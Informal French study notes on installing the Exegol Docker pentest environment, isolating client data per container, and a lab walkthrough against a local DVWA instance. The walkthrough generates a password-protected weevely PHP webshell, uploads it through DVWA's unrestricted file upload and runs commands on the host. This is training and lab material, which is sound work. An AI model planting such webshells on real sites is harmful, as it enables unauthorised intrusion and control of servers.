Pour l'audit 
pour CTF
etude pesro
on peut utliser un container pour chaque client

exemple , on a client A , client B , client C

1. pourvoir d'utiliser 3 contianer different , chaque container dedié à chaque client , chaque donné  contenu dans chaque container ne se communique pas avec les autres et ne communique pas avec le systemes hotes
2. donc on peut detruire simplement un container simplement pour detruire simplement son donné pour la confidentialité
3. Alias et historique de commande deja en place
4. Shel deja journalisé( on ne perdrait plus les rendu d'une commande)
5. en peut mettre une systeme de workspace pour chaque container pour recuperer des donnée uniquement à partir d'un repertoire

se partage en 3 ripos

wrapper python : sert à manipuuler les images docker
resources exegol : binaire  , tout les commande à executer durant l'audit
images docker : le repos qui heberge le dockerfile(image web,AD,Light,Nightly...),comme ça on n'a pas besoin de telecharger la gros version tout le temps

on installe avec

apt update

apt install vokoscreen

apt install docker.io

apt install pipx

pipx ensurepath

pipx install exegol

pipx upgrade exegol

reboot

install exegol

Une fois installé, on peut demmarer un container avec exogol start avec le nom du container 

exemple exegol start master

on peut taper maintemant des commandes comme :
burpsuitecommunity pour la pentest web pour afficher et intercepter les traffic http
On peut faire run DVWA pour expoiter ses vulnerabilité
docker run --rm -it -p 80:80 vulnerables/web-dvwa

maintenant , on upload un fichier directement dans le web de dvwa , on voit directement que tout fichier meme des virus ou autre peu etre uploader
donc on va utiliser un outil exegol qui s'appelle weevely qui genere des webshell securisé

weevely generate MyP4ssword1337 beacon.php

c'est ici la jonction entre la systeme hôte et le container  docker , c'est a dire que tout ce que j'ecris sur ce repertoire et aussi ecris sur le hotes donc le websheel est donc present sur le hote
une fois ce fichier webshell est telechargé , on peut acceder directement avec weevly
 weebly http://localhost/...../beacon.php MyP4ssword1337
 quand on tape id , le site web est hacké